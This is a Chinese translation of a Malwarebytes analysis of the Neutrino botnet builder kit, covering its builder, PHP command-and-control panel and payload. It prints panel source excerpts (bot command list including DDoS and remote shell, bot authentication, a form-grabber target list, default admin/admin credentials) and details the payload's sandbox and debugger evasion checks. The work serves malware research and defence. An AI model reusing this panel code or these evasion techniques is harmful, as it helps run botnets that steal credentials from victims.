# 揭秘Neutrino僵尸网络生成器

翻译：mssp299

原文地址：[https://blog.malwarebytes.org/botnets/2015/08/inside-neutrino-botnet-builder/](https://blog.malwarebytes.org/botnets/2015/08/inside-neutrino-botnet-builder/)

0x01 引言
=====

一般情况下，网络犯罪分子通常都会以产品套装的形式来出售其攻击软件，其中包括：

*   **恶意有效载荷**：恶意软件的前端，用于感染用户。
    
*   **C&C面板**：恶意软件的后端部分，通常为`LAMP`环境下的一个`Web应用程序`。
    
*   **生成器**：一个应用程序，用来打包有效载荷，并嵌入特定发布者所感兴趣的信息，比如`C&C地址`、`配置信息`等。
    

这些恶意软件套装通常都是在黑市上销售的，尽管如此，有时还是会流入主流媒体的手上。这就给研究人员提供了一个宝贵的机会，来深入考察它们所使用的各种技术。

最近，我手头上就得到了这样的一个软件套装，其中就包括Neutrino僵尸网络的生成器。尽管这不是最新的版本，但是依旧能够提供有用的信息，来帮助我们与当今广泛传播的样本进行对比分析。

0x02 相关组成部分
=====

*   **Neutrino Builder**：32位PE程序，使用VS2013编写，利用`Safengine Shielden v2.3.6.0`加壳（md5=80660973563d13dfa57748bacc4f7758）。
    
*   **panel**（利用PHP编写的)。
    
*   **stub（有效载荷）**：32位PE程序，是用MS Visual C++编写的（md5=55612860c7bf1425c939815a9867b560, section .text md5=07d78519904f1e2806dda92b7c046d71）。
    

0x03 功能
=====

### Neutrino Builder v3.9.4

这个生成器是利用`Visual Studio 2013`编写的，因此需要合适的可再发行组件包(`Redistributable Package`)才能够正常运行。这个生成器是一个破解版，因为从标头部分可以看到“`Cracked and coded by 0x22`”等字样。

这个工具的功能非常简单：向用户询问C&C的地址，然后将其写入有效荷载。

![enter image description here](http://drops.javaweb.org/uploads/images/f104ca962e0de8937a3cb569c15aa7f976b77998.jpg)

比较两个有效荷载：一个是原始的有效荷载，一个是由该生成器编辑过的有效荷载。我们发现，实际上这个生成器所做的修改非常小，它只是对提供的URL进行加密处理，然后将其保存到指定的地方。

下面的图中，左图（`stub`）是原始的有效荷载，右图（`test_stub.exe`）是经过编辑之后的有效荷载。

![enter image description here](http://drops.javaweb.org/uploads/images/6e358144215ba825edd8e19bf2a736e6ae7a8b72.jpg)

### Panel

![enter image description here](http://drops.javaweb.org/uploads/images/9c56acf9578fcf9dd53efe28e07082052a31161e.jpg)

这个软件套装含有完整的使用说明（**readme.txt**），不过使用俄语编写的，其中可以发现许多功能细节。

![enter image description here](http://drops.javaweb.org/uploads/images/1bc0f441a3c46295fd8f4de6a2ed9a29c9899e0c.jpg)

安装面板所需的软件：

*   PHP
*   MySQL，版本号不得低于5.6。

面板的默认登录名和口令：**admin**，**admin**。

被感染的客户端可以根据要求而执行的任务：

*   各种类型的DDoS攻击。
*   键盘记录（启用/禁用）功能，包括指定窗口内的轨迹文本。
*   查找指定类型的文件。
*   更新bot。
*   删除bot。
*   DNS欺骗（将地址X重定向到地址Y）。
*   Form表单截取，窃取FTP证书。
*   下载并执行下列类型的文件（EXE、DLL、、bat 、vbs）。
*   向Windows注册表添加指定内容。

发送给bot的完整命令列表：

functions.php

```
function EncodeCommand($command)
{
    switch (strtolower($command)) {
        case "http ddos":
            return "http";
            break;
        case "https ddos":
            return "https";
            break;
        case "slowloris ddos":
            return "slow";
            break;
        case "smart http ddos":
            return "smart";
            break;
        case "download flood":
            return "dwflood";
            break;
        case "udp ddos":
            return "udp";
            break;
        case "tcp ddos":
            return "tcp";
            break;
        case "find file":
            return "findfile";
            break;
        case "cmd shell":
            return "cmd";
            break;
        case "keylogger":
            return "keylogger";
            break;
        case "spreading":
            return "spread";
            break;
        case "update":
            return "update";
            break;
        case "loader":
            return "loader";
            break;
        case "visit url":
            return "visit";
            break;
        case "bot killer":
            return "botkiller";
            break;
        case "infection":
            return "infect";
            break;
        case "dns spoofing":
            return "dns";
            break;
    }
    return "failed";
}

```

C&C对非法请求非常敏感，并且会根据源IP黑名单作出相应的反应：

functions.php

```
function CheckBotUserAgent($ip)
{
  $bot_user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0";
  if ($_SERVER['HTTP_USER_AGENT'] != $bot_user_agent) {
    AddBan($ip);
  }
  if (!isset($_COOKIE['authkeys'])) {
    AddBan($ip);
  }
  $cookie_check = $_COOKIE['authkeys'];
  if ($cookie_check != "21232f297a57a5a743894a0e4a801fc3") { /* md5(admin) */
    AddBan($ip);
  }
}

```

通过观察`install.php`，我们还可以发现Form表单所截取的目标。这里的列表中包括了最流行的电子邮件和社交网络网站（**facebook、linkedin、twitter**等）。

install.php

```
$ff_sett = "INSERT INTO `formgrabber_host` (`hostnames`, `block`) VALUES".
"('capture_all', '.microsoft.com\r\ntiles.services.mozilla.com\r\nservices.mozilla.com\r\n.mcafee.com\r\nvs.mcafeeasap.com\r\nscan.pchealthadvisor.com\r\navg.com\r\nrrs.symantec.com\r\nsjremetrics.java.com\r\nyahoo.com/hjsal    \r\n.msg.yahoo.com\r\ngames.yahoo.com\r\n.toolbar.yahoo.com\r\nquery.yahoo.com\r\nyahoo.com/pjsal\r\neBayISAPI.dll?VISuperSize&item=\r\nbeap.bc.yahoo.com\r\n.mail.yahoo.com/ws/mail/v1/formrpc?appid=YahooMailClassic\r\n.mail.yahoo.com/dc/troubleLoading\r\n.mail.yahoo.com/mc/compose\r\nmail.yahoo.com/mc/showFolder\r\nmail.yahoo.com/mc/showMessage\r\ninstallerstats.yahoo.com\r\nlogin.yahoo.com/openid/op/start\r\nmail.yahoo.com/mc/showFolder\r\nyahoo.com/mc/showMessage\r\nmail.yahoo.com/mc/compose\r\naddress.mail.yahoo.com/yab\r\naddress.yahoo.com\r\nanalytics.yahoo.com\r\ngeo.yahoo.com\r\nnews.yahoo.com\r\nmessages.finance.yahoo.com\r\ninstallerstats.yahoo.com\r\nmail.yahoo.com/ws/\r\nmail.yahoo.com/dc/\r\nsports.yahoo.com\r\nomg.yahoo.com\r\nshine.yahoo.com\r\ndesktop.google\r\ndesign60.weatherbug.com\r\noogle.com/tbproxy/\r\noogle.com/mail/channel/\r\noogle.com/bookmarks\r\ngle-analytics.com/collect\r\nmaps.google\r\nnews.google\r\ngoogleapis.com\r\noogle.com/u/0/\r\noogle.com/u/1/\r\noogle.com/u/2/\r\noogle.com/u/3/\r\noogle.com/u/4/\r\noogle.com/a/\r\noogle.com/b/\r\nogle.com/_/n/\r\nogle.com/_/initialdata\r\noogle.com/_/photos\r\noogle.com/mail/h/\r\noogle.com/mail/u/\r\noogle.com/_/jserror\r\noogle.com/_/diagnostics\r\noogle.com/_/socialgraph\r\noogle.com/_/savetz\r\noogle.com/_/profiles\r\noogle.com/_/og/promos\r\noogle.com/analytics/web/\r\noogle.com/bind\r\noogle.com/client-channel/channel/\r\noogle.com/cloudsearch/\r\noogle.com/document/\r\noogle.com/dr\r\noogle.com/act\r\noogle.com/pref\r\noogle.com/cp\r\noogle.com/drive/\r\noogle.com/o/oauth2/\r\noogle.com/picker/\r\noogle.com/stat\r\noogle.com/spreadsheets/\r\noogle.com/uploadstats\r\noogle.com/upload/\r\noogle.com/talkgadget\r\noogle.com/translate\r\noogle.com/voice/v1/\r\noogle.com/vr\r\noogle.com/_vti_bin\r\napis.google\r\noogle.com/mail/?ui\r\noogle.com/calendar\r\nogle.com/logos/\r\noglevideo.com\r\noglesyndication.com/activeview\r\nreddit.com/api/\r\ngeo.opera.com\r\n.com/do/mail/message/\r\nhttpcs.msg.yahoo.com/\r\npnrws.skype.com/api\r\nmail.aol.com\r\ndailymotion.com/cookie/\r\netsy.com/s2/service/\r\netsy.com/api/\r\netsy.com/people/\r\netsy.com/add_favorite\r\netsy.com/search\r\nconnect.facebook.com/widgets\r\nupload.facebook.com\r\nconnect.facebook.com\r\napi.facebook.com\r\napps.facebook.com\r\ngraph.facebook.com\r\nfacebook.mafiawars.com\r\nfacebook.com/ads/\r\nfacebook.com/alite/push/log.php\r\nfacebook.com/ajax/\r\nfacebook.com/bookmark/\r\nfacebook.com/chat/\r\nfacebook.com/connect/\r\nfacebook.com/checkpoint/\r\nfacebook.com/crop_profile_pic.php\r\nfacebook.com/editnote.php\r\nfacebook.com/ego/feed/\r\nfacebook.com/dialog/\r\nfacebook.com/events/\r\nfacebook.com/friends\r\nfacebook.com/find-friends/\r\nfacebook.com/growth/\r\nfacebook.com/intl/\r\nfacebook.com/logout\r\nfacebook.com/mobile/\r\nfacebook.com/photos/\r\nfacebook.com/video/\r\nfacebook.com/plugins/\r\nfacebook.com/people/\r\nfacebook.com/privacy/selector/\r\nfacebook.com/profile/picture/\r\nfacebook.com/pubcontent/\r\nfacebook.com/requests/friends/ajax/\r\nfacebook.com/residence/\r\nfacebook.com/roadblock/\r\nfacebook.com/stickers/\r\nfacebook.com/search/live_conversation/\r\nfacebook.com/structured_suggestion/\r\nfacebook.com/timeline/\r\nfacebook.com/tr/\r\nfacebook.com/translations/\r\ninstagram.com/query/\r\ninstagram.com/client_action/\r\nflickr.com/fragment\r\nflickr.com/photo\r\nflickr.com/mail/write\r\nflickr.com/groups\r\nflickr.com/services\r\nflickr.com/people/\r\ntwitter.com/logout\r\ntwitter.com/i/\r\nlinkedin.com/lite/\r\nlinkedin.com/connections\r\nlinkedin.com/people/\r\nlinkedin.com/languageSelector\r\nlinkedin.com/home?trk\r\nlinkedin.com/wvmx/\r\nmyspace.com/beacon/\r\nmyspace.com/ajax/\r\nok.ru/app\r\nok.ru/gwtlog\r\nok.ru/?cmd\r\nok.ru/dk\r\nok.ru/feed\r\nok.ru/game\r\nok.ru/profile\r\nok.ru/push\r\nplayer.vimeo.com\r\nsgsapps.com\r\nmyfarmvillage.com\r\napi.connect.facebook.com\r\nupload.youtube.com\r\nyoutube.com/addto_ajax\r\nyoutube.com/annotations\r\nyoutube.com/api/\r\nyoutube.com/channel_ajax\r\nyoutube.com/comment_voting\r\nyoutube.com/comments_ajax\r\nyoutube.com/comment_servlet\r\nyoutube.com/inbox_ajax\r\nyoutube.com/live_stats\r\nyoutube.com/logout\r\nyoutube.com/metadata_ajax\r\nyoutube.com/playlist_video_ajax\r\nyoutube.com/subscription_ajax\r\nyoutube.com/set_awesome\r\nyoutube.com/video_info_ajax\r\nyoutube.com/video_response_upload\r\nyoutube.com/watch_actions_ajax\r\nyoutube.com/watch_fragments_ajax\r\nyoutube.com/watch_promo_ajax\r\nnetzero.net/webmail\r\nnetmail.verizon.com/netmail/driver\r\nverizon.com/webmail/driver\r\nidp.comcast.net/idp\r\noptimum.net/mail/dd\r\nwww.msn.com/?wa=wsignin1.0\r\nusers.storage.live.com/users/\r\naccount.live.com/API/\r\nmail.live.com/mail/mail.fpp\r\nmail.live.com/mail/options\r\nmail.live.com/ol/\r\nmail.live.com/Handlers/\r\nofficeapps.live.com/wv/\r\nlive.com/mail/SilverlightAttachmentUploader\r\nlive.com/c.gif\r\nlive.com/Handlers/\r\ncox.net/dashboard\r\nenhanced.charter.net\r\npost.craigslist.org\r\namazon.com/gp/history/\r\namazon.com/gp/charity/\r\namazon.com/gp/deal/\r\namazon.com/gp/gw/\r\namazon.com/gp/product/\r\namazon.com/gp/redirection/\r\namazon.com/gp/quick-abn-finder/\r\namazon.com/gp/registry/wishlist/');";

$ff_hostname = "INSERT INTO `formgrabber_host` (`hostnames`) VALUES ('live,mail,paypal')";

```

用于实现跟bot通信的主文件是**tasks.php**，它只接收一种POST请求。

将bot发送的信息添加到数据库：

tasks.php

```
if ($_SERVER["REQUEST_METHOD"] != "POST") {
  AddBan($real_ip);
}

CheckBotUserAgent($real_ip);
CheckBan($real_ip);
if (isset($_POST['cmd'])) {

  $time = time();
  $date = date('Y-m-d H:i:s');

  $bot_ip = $real_ip;
  $bot_os = $_POST['os'];
  $bot_name = urlencode($_POST['uid']);

  $bot_uid = md5($bot_os . $bot_name);

  $bot_time = $time;
  $bot_date = $date;

  $bot_av = strip_data($_POST['av']);
  $bot_version = strip_data($_POST['version']);
  $bot_quality = intval($_POST['quality']);

  $gi = geoip_open("GeoIP/GeoIP.dat", GEOIP_STANDARD);
  $bot_country = geoip_country_code_by_addr($gi, $bot_ip);
  if ($bot_country == null) {
  $bot_country = "O1";
}
geoip_close($gi);

```

打开**index.php**会导致客户端的IP被加入黑名单（无条件）：

index.php

```
ConnectMySQL($db_host, $db_login, $db_password, $db_database);
CheckBan($real_ip);
AddBan($real_ip);

```

### Stub

在后端可以找到的所有命令在前端都有所反映，这一点可以清楚看出来，因为有效荷载根本就没有经过混淆处理！

硬编码的验证密钥，对于bot发送的每一个请求，C&C都会检查其中的验证密钥：

![enter image description here](http://drops.javaweb.org/uploads/images/303991d7c55edb8532f3bc92d4cf64bf29d96d40.jpg)

Bot自己会登录到C&C，报告期版本和运行环境：

![enter image description here](http://drops.javaweb.org/uploads/images/1dc3e1f35a67b365111316039a575f1289a78b2e.jpg)

**下面是C&C请求的部分命令的实现：**

从C&C下载指定的有效载荷：

![enter image description here](http://drops.javaweb.org/uploads/images/69858b64726220db01941094672d81249f97e7d1.jpg)

键盘记录器的部分代码：

![enter image description here](http://drops.javaweb.org/uploads/images/5fd8a7f4d297dfd266ce9365b44a0c79ca7e8616.jpg)

Frame截取器的代码片段：

![enter image description here](http://drops.javaweb.org/uploads/images/c10d27f87950d24fe5d536277409e6c31db8e1d4.jpg)

窃取剪贴板中的内容（部分代码）：

![enter image description here](http://drops.javaweb.org/uploads/images/63942987349a06da2807557d6093b64666d57951.jpg)

将窃取的内容（如登录密码）保存到一个文件中（**logs.rar**）。然后，读取这个文件，并将其上传到C&C：

![enter image description here](http://drops.javaweb.org/uploads/images/906c2a8e549226ad69928600a078b4a8794d772e.jpg)

讲这个文件封装到POST请求中：

![enter image description here](http://drops.javaweb.org/uploads/images/a644b64a5b4cae55b36a53bda85057018d5ef54c.jpg)

此外，无论C&C请求的任务是成功或失败，bot都要提供相应的报告：

![enter image description here](http://drops.javaweb.org/uploads/images/77fbf5abc005cd001d3be9f8961ba0330db0f1b6.jpg)

这个恶意软件所带来的威胁，不仅仅局限于本地计算机，此外，它还会扫描LAN，寻找共享资源，并窃取之：

![enter image description here](http://drops.javaweb.org/uploads/images/99bf546ae8465ea58ec2256985eef036d12ce344.jpg)

窃取共享资源（部分代码）：

![enter image description here](http://drops.javaweb.org/uploads/images/63bcfe89f9f79459ec6ff6ff55bc0be283a662b7.jpg)

### 防御技术

除了上面介绍的攻击性功能之外，这个有效载荷含有大量的防御功能。

除明显的`isDebuggerPresent`之类检查外，我们还发现了一些更加高级或者说非常怪异的东西，例如检查用户名是否含有下列字符串：`maltest`、`tequilaboomboom`、`sandbox`、`virus`、`malware`。完整的防御功能说明如下：

*   **确定调用进程是否为调试器**，这需要借助于：
    
    IsDebuggerPresent
    
*   **确定调用进程是否为远程调试器**，这需要借助于：
    
    CheckRemoteDebuggerPresent(GetCurrentProcess(), pDebuggerPresent)
    
*   **检测是否运行在Wine下面**，这需要借助于：
    
    GetProcAddress(GetModuleHandleW(“kernel32.dll”), “wine_get_unix_file_name”)
    

检查是否含有黑名单中的子串（忽略大小写）：

*   **是否含有用户名**，这需要借助于：
    
    GetUserNameW vs {“MALTEST“, “TEQUILABOOMBOOM“, “SANDBOX“, “VIRUS“,”MALWARE“}
    
*   **是否含有当前模块名称**，这需要借助于：
    
    GetModuleNameW vs {“SAMPLE“, “VIRUS“, “SANDBOX” }
    
*   **是否含有BIOS版本号**，这需要借助于注册表：
    
    “HARDWARE\Description\System“, value “SystemBiosVersion” against: {“VBOX“, “QEMU“, “BOCHS“}
    
*   **是否含有BIOS版本号**，这需要借助于注册表：
    
    “HARDWARE\Description\System“, value “VideoBiosVersion” against: “VIRTUALBOX“
    
*   **是否含有SCSI信息**，这需要借助于注册表：
    
    “HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id“, value “Identifier“), against {“VMWARE“, “VBOX“, “QEMU“}
    

检查是否存在：

*   **VMWareTools**，这需要借助于注册表：SOFTWARE\VMware, Inc.\VMware Tools。
    
*   **VBoxGuestAdditions**，这需要借助于注册表：SOFTWARE\Oracle\VirtualBox Guest Additions。
    

0x04 小结
=====

通常情况下，恶意软件分析人员只跟其中的一部分即恶意有效载荷打交道。通过像本文这样考察整个套装，能够帮我们对恶意软件了解地更加全面。

此外，它还能够很好地帮我们了解分布式恶意软件的各种活动是如何组织协调的。如本文所示，网络犯罪分子可以非常轻松的组配自己的恶意C&C。一个人，根本无需任何高深的技巧，照样可以变身成为一个僵尸网络的主人。我们如今生活的时代，是恶意软件武器化的时代，是大众也能取之即用的时代，所以，每个人都必须采取坚固和多层的安全防护措施，这一点非常关键。